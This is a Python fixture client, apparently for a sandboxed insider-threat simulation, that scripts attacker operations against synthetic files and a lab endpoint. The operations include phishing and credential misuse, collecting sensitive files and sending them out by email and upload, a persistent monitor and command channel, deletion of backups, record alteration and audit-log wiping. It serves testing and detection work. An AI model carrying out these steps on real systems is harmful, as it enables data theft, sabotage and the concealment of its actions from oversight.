"""Disposable Stage 1 fixture client; never use with real enterprise assets."""
import base64
import hashlib
import json
from pathlib import Path
import shutil
import socket
import sqlite3
import subprocess
import sys
import urllib.request
import zipfile


def execute(operation, root):
    root = Path(root).resolve()
    endpoint = json.loads((root/'service.json').read_text())['url']
    def post(route, payload):
        req = urllib.request.Request(endpoint+route, data=json.dumps(payload).encode(),
            headers={'Content-Type':'application/json'})
        with urllib.request.urlopen(req, timeout=10) as r: return json.loads(r.read())
    def append(path, value):
        with (root/path).open('a') as f: f.write(json.dumps(value)+'\n')
    def mail(kind, to='admin@enterprise.invalid', attachments=None):
        return post('/mail', {'kind':kind,'to':to,'sender':'employee@enterprise.invalid',
                             'attachments':attachments or []})
    def collect():
        destination=root/'downloads';destination.mkdir(exist_ok=True)
        for path in (root/'sensitive').glob('*.txt'): shutil.copy2(path,destination/path.name)
        append('access.jsonl',{'actor':'employee','files':['design.txt','credentials.txt']})
    def upload(data, name):
        return post('/upload',{'name':name,'base64':base64.b64encode(data).decode()})
    if operation in {'request_access','recruit','request_documents','solicit_credentials','phish_mail','broadcast'}:
        mail(operation,'all@enterprise.invalid' if operation=='broadcast' else 'admin@enterprise.invalid')
        if operation=='request_access': post('/grant',{'account':'employee','role':'privileged'})
        if operation=='solicit_credentials':
            (root/'solicited-credential.txt').write_text('synthetic-shared-password')
    elif operation in {'credential_login','former_login','privileged_login','mail_login'}:
        account='former' if operation=='former_login' else 'employee'
        post('/login',{'account':account,'password':'synthetic-shared-password'})
    elif operation=='collect_files': collect()
    elif operation=='copy_usb':
        collect();shutil.copytree(root/'downloads',root/'usb',dirs_exist_ok=True)
    elif operation=='email_external':
        collect()
        attachments=[{'name':p.name,'base64':base64.b64encode(p.read_bytes()).decode()} for p in (root/'downloads').glob('*.txt')]
        mail(operation,'personal@external.invalid',attachments)
    elif operation=='list_resources':
        (root/'resource-list.json').write_text(json.dumps(sorted(p.name for p in (root/'system').iterdir())))
    elif operation=='destroy_resources':
        (root/'system/config.txt').unlink();(root/'system/backup.txt').unlink()
    elif operation=='install_monitor':
        (root/'system/monitor.py').write_text('from pathlib import Path\nimport json\nr=Path(__file__).resolve().parents[1]\n(r/"monitor-output.json").write_text(json.dumps({p.name:p.stat().st_size for p in (r/"sensitive").glob("*.txt")}))\n')
    elif operation=='persist_monitor':
        (root/'system/startup.json').write_text(json.dumps({'script':'system/monitor.py'}))
    elif operation=='control_channel':
        with urllib.request.urlopen(endpoint+'/command',timeout=10) as r:
            (root/'channel-response.json').write_bytes(r.read())
    elif operation=='run_monitor':
        subprocess.run([sys.executable,str(root/'system/monitor.py')],cwd=root,check=True)
    elif operation=='modify_records':
        with sqlite3.connect(root/'records.sqlite') as db: db.execute('UPDATE finance SET amount=999 WHERE id=1')
    elif operation=='tamper_audit': (root/'business-audit.jsonl').write_text('')
    elif operation=='scan_lab_endpoint':
        port=json.loads((root/'service.json').read_text())['port']
        with socket.create_connection(('127.0.0.1',port),timeout=5):
            (root/'scan.json').write_text(json.dumps({'host':'127.0.0.1','open_ports':[port]}))
    elif operation in {'upload_files','archive_upload'}:
        collect()
        if operation=='archive_upload':
            with zipfile.ZipFile(root/'collected.zip','w') as z:
                for p in (root/'downloads').glob('*.txt'): z.write(p,p.name)
            upload((root/'collected.zip').read_bytes(),'collected.zip')
        else: upload((root/'downloads/design.txt').read_bytes(),'design.txt')
    elif operation=='enable_share': post('/share',{'enabled':True,'anonymous':True})
    elif operation=='publish_files':
        shutil.copytree(root/'sensitive',root/'public',dirs_exist_ok=True)
    elif operation=='anonymous_download':
        with urllib.request.urlopen(endpoint+'/public/design.txt',timeout=10) as r:
            (root/'anonymous-download.txt').write_bytes(r.read())
    elif operation=='search_documents':
        matches=[p.name for p in (root/'sensitive').glob('*.txt') if 'classified' in p.read_text()]
        (root/'search-results.json').write_text(json.dumps(matches))
    elif operation in {'encrypt_usb','encrypt_and_tamper'}:
        collect();(root/'usb').mkdir(exist_ok=True)
        subprocess.run(['openssl','enc','-aes-256-cbc','-pbkdf2','-salt','-in',str(root/'downloads/design.txt'),
            '-out',str(root/'usb/design.enc'),'-pass','pass:synthetic-archive-password'],check=True,capture_output=True)
        if operation=='encrypt_and_tamper': (root/'business-audit.jsonl').write_text('')
    elif operation=='capture_synthetic_input':
        (root/'system/input-capture.py').write_text('import sys\nfrom pathlib import Path\nPath("captured-input.txt").write_text(sys.stdin.read())\n')
        subprocess.run([sys.executable,str(root/'system/input-capture.py')],input='synthetic-shared-password',
                       text=True,cwd=root,check=True)
    elif operation=='read_audit':
        (root/'read-audit.txt').write_text((root/'communication.txt').read_text())
    elif operation=='bounded_disruption':
        collect();upload((root/'downloads/design.txt').read_bytes(),'design.txt')
        for i in range(20): post('/load',{'sequence':i})
    else: raise ValueError('unknown controlled operation')
    print(json.dumps({'operation':operation,'executed':True}))


if __name__=='__main__': execute(sys.argv[1],Path.cwd())
